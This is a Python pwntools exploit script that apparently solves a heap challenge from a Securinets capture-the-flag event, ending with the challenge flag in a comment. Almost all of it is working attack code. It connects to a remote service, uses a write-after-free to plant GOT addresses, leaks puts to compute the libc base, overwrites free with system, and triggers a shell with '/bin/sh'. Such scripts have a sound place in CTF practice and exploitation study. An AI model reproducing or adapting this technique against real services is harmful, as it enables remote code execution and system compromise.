from pwn import *
elf = ELF('./main', checksec=False)
#libc = ELF('/usr/lib/libc.so.6', checksec=False)
libc = ELF('./libc6_2.30-0ubuntu2_amd64.so', checksec=False)

#p = elf.process()
p = remote('3.91.74.70', 1028)
def add(size,data):
    p.sendlineafter('>', '1')
    p.sendlineafter('name?', str(size))
    p.sendafter('name:', str(data))

def edit(idx, size, data):
    p.sendlineafter('>', '2')
    p.sendlineafter('?\n', str(idx))
    p.sendlineafter('length:', str(size))
    p.sendline(str(data))
    p.sendline()

def view(idx):
    p.sendlineafter('>', '4')
    p.sendlineafter('?\n', str(idx))
    return p.recvline().strip()[-6:]

def delete():
    p.sendlineafter('>', '5')

for i in xrange(7):
    print i,
    add(0x18, 'asw')
print()

delete()    # free in exit func

for i in xrange(7):
    print i,
    edit(i, 8, p64(0x6020e0))   # this pointer will be overwritten
print()

# write-after-free
add(0x18, '/bin/sh')    
add(0x18, p64(elf.got['puts']) + p64(elf.got['free']))

leak = u64(view(0).ljust(8, '\x00'))
libc.address = leak - libc.sym['puts']
log.info('leak addr : 0x%x'%leak)
log.info('libc base : 0x%x'%libc.address)

edit(1, 8, p64(libc.sym['system'])) # overwrite free with system

delete()    # trigger shell
p.interactive()

# securinets{house_of_force_in_2020_bruh!!}